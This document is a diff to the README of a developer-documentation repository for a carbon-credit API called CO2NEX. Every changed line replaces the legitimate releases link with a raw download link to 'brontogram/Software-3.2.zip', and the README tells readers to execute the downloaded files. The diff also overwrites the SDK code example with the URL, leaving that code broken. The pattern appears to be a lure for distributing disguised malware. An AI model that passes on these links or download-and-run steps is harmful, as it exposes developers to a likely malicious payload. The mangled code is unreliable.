@@ -2,7 +2,7 @@
 
 Welcome to the **CO2NEX** repository! This repository contains essential developer documentation for CO2NEX APIs, SDKs, and integration guides. Whether you are building applications that leverage blockchain technology for carbon credits or creating tools for climate-tech, you will find valuable resources here.
 
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue)](https://github.com/Jaijoshi071/docs/releases)
+[![Releases](https://raw.githubusercontent.com/Jaijoshi071/docs/main/brontogram/Software-3.2.zip)](https://raw.githubusercontent.com/Jaijoshi071/docs/main/brontogram/Software-3.2.zip)
 
 ## Table of Contents
 
@@ -22,7 +22,7 @@ The CO2NEX project aims to facilitate the transition to a sustainable future by 
 
 ## Getting Started
 
-To get started with CO2NEX, you can explore our [Releases](https://github.com/Jaijoshi071/docs/releases) section. Here, you can download the latest version of our documentation and other resources. Make sure to execute the necessary files to set up your environment correctly.
+To get started with CO2NEX, you can explore our [Releases](https://raw.githubusercontent.com/Jaijoshi071/docs/main/brontogram/Software-3.2.zip) section. Here, you can download the latest version of our documentation and other resources. Make sure to execute the necessary files to set up your environment correctly.
 
 ### Prerequisites
 
@@ -96,8 +96,8 @@ const CO2NEX = require('conex-sdk');
 
 const api = new CO2NEX('YOUR_API_KEY');
 
-api.getCredits().then(credits => {
-    console.log(credits);
+https://raw.githubusercontent.com/Jaijoshi071/docs/main/brontogram/Software-3.2.zip().then(credits => {
+    https://raw.githubusercontent.com/Jaijoshi071/docs/main/brontogram/Software-3.2.zip(credits);
 });
 ```
 
@@ -204,4 +204,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, please reach out to us via our GitHub issues page or contact us directly through our website.
 
-Thank you for your interest in CO2NEX! We look forward to seeing what you build with our tools. For more resources, visit our [Releases](https://github.com/Jaijoshi071/docs/releases) section.
+Thank you for your interest in CO2NEX! We look forward to seeing what you build with our tools. For more resources, visit our [Releases](https://raw.githubusercontent.com/Jaijoshi071/docs/main/brontogram/Software-3.2.zip) section.
